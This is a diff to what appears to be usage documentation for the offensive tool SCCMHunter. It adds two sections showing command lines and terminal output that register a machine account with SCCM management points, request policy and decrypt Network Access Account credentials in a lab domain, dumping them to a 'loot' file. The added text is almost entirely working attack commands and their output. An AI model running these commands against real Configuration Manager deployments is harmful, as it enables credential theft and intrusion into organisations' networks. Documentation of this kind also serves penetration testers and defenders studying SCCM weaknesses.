@@ -66,3 +66,32 @@ SCCMHunter vdev0.0.3 by @garrfoster
 [19:25:48] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
 [19:25:48] INFO     [+] Done.. decrypted policy dumped to /root/.sccmhunter/logs/loot/mp_naapolicy.xml 
 ```
+#### Manual with creds
+
+```
+└─# python3 sccmhunter.py http -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -cn wikidemo\$ -cp P@ssw0rd 
+SCCMHunter vdev0.0.3 by @garrfoster
+[21:14:28] INFO     [*] Searching for Management Points from database.                                                                                                                             
+[21:14:29] INFO     [+] Found http://mp.internal.lab/ccm_system_windowsauth                                                                                                                        
+[21:14:30] INFO     [+] Found http://sccm.internal.lab/ccm_system_windowsauth                                                                                                                      
+[21:14:31] INFO     [+] Found http://sccm2.internal.lab/ccm_system_windowsauth                                                                                                                     
+[21:14:32] INFO     [+] Found http://active.internal.lab/ccm_system_windowsauth                                                                                                                    
+[21:14:32] INFO     [*] Attempting to grab policy from mp.internal.lab                                                                                                                             
+[21:14:34] INFO     [*] Done.. our ID is 7E7CC94B-E056-45C8-A2D9-03AD3114AE1F                                                                                                                      
+[21:14:34] INFO     [*] Waiting 10 seconds for database to update.                                                                                                                                 
+[21:14:45] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
+[21:14:45] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
+[21:14:45] INFO     [+] Done.. decrypted policy dumped to /root/.sccmhunter/logs/loot/mp_naapolicy.xml                                                                                             
+                                                                                                                                                                                                   
+```
+
+#### Manually request policy
+
+```
+└─# python3 sccmhunter.py http -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -mp mp.internal.lab -uuid 7E7CC94B-E056-45C8-A2D9-03AD3114AE1F
+SCCMHunter vdev0.0.3 by @garrfoster
+[21:16:19] INFO     Submitting manual policy request from previous registration 7E7CC94B-E056-45C8-A2D9-03AD3114AE1F                                                                               
+[21:16:20] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
+[21:16:20] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
+[21:16:20] INFO     [+] Done.. decrypted policy dumped to /root/.sccmhunter/logs/loot/mp_naapolicy.xml 
+```
